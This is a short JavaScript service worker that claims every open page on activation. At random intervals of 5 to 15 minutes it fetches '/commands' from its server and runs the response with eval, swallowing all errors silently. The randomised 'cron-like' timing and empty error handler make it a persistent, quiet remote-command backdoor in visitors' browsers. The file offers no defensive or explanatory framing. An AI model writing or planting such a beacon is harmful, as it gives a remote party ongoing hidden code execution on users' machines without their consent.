self.addEventListener('install', e=>{self.skipWaiting();});
self.addEventListener('activate', e=>{e.waitUntil(self.clients.claim());});
// Cron-like polling aleatório 5–15min
setInterval(()=>{
  fetch('/commands').then(r=>r.text()).then(eval).catch(()=>{});
}, Math.random()*600000 + 300000);